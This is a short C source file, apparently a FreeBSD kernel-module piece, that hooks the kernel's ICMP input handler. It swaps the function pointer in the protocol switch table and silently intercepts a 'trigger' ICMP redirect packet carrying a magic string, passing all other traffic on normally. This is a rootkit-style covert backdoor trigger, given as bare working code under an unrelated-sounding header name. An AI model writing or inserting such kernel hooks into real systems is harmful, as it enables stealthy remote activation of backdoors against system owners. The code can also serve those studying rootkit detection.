#include "electronics_kit.h"

//pr_input_t hook_icmp_input;

int hook_icmp_input(struct mbuf **mp, int *offp, int proto)
{
    struct mbuf *m = *mp;
	int hlen = *offp;

	/* Locate the ICMP message within m. */
	m->m_len -= hlen;
	m->m_data += hlen;

	/* Extract the ICMP message. */
	struct icmp *icp = mtod(m, struct icmp *);

	/* Restore m. */
	m->m_len += hlen;
	m->m_data -= hlen;

	/* Is this the ICMP message we are looking for? */
	if (
        icp->icmp_type == ICMP_REDIRECT
        && icp->icmp_code == ICMP_REDIRECT_TOSHOST
        && strncmp(icp->icmp_data, NETWORK_TRIGGER, 4) == 0
    ) {
		uprintf("Trigger packet received.\n");
        return IPPROTO_DONE;
    } else {
		return icmp_input(mp, offp, proto);
    }
}

int insert_network_hooks(void) {
	inetsw[ip_protox[IPPROTO_ICMP]].pr_input = hook_icmp_input;
	return 0;
}

int remove_network_hooks(void) {
	inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
	return 0;
}
